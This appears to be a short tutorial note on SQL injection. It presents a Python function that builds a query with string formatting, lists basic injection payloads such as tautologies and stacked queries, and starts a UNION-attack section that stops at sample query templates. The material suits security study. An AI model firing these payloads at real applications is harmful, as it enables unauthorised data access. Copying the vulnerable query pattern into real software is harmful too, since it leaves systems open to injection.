# SQLi
## The source is [here](https://owasp10-c874b6974594.notion.site/Code-Example-450b5fc335614b348956cb6087dfaa2d)


### The Basic and usefull Commands
```python
def user_exists(username: str) -> bool:
    with connection.cursor() as cursor:
        cursor.execute("""
            SELECT
                Id
            FROM
                users
            WHERE
                username = '%s'
        """ % username)
        result = cursor.fetchone()
    id, = result
    return id
```
* attack is like this
```sql
user_exists('test') #False
#select id from users where username = 'test'

user_exists("'; select 1=1; --") #True
#select id from users where username = ''; select true; --'
```

```sql
'; select 1=1; -—
```
```sql
'; select 1=1; #
```
### Simplest injection
```sql
' or 1=1#
```
```sql
' or 1=1--
```
### UNION ATTACK 
when a web application show Direct result, we should use UNION Attack

```sql
select * from news where news_id = $NEWSID;
select * from news where news_id = '$NEWSID';
select * from news where news_id = "$NEWSID";
```
